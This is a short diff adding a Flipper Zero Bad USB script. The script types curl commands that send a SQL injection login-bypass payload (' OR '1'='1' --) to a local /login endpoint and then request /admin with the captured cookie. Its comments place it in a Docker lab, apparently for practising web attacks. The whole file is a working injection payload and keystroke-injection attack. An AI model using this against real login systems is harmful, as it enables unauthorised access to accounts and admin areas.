@@ -1,0 +1,10 @@
+REM Flipper Zero Bad USB — SQL injection login bypass
+REM Types a curl command that sends the classic ' OR '1'='1 payload to /login.
+REM All damage is inside the Docker container.
+
+DELAY 1000
+STRING curl -s -c /tmp/cookies.txt -X POST http://localhost:5000/login -d "username=' OR '1'='1' --&password=x" -L
+ENTER
+DELAY 500
+STRING curl -s -b /tmp/cookies.txt http://localhost:5000/admin
+ENTER
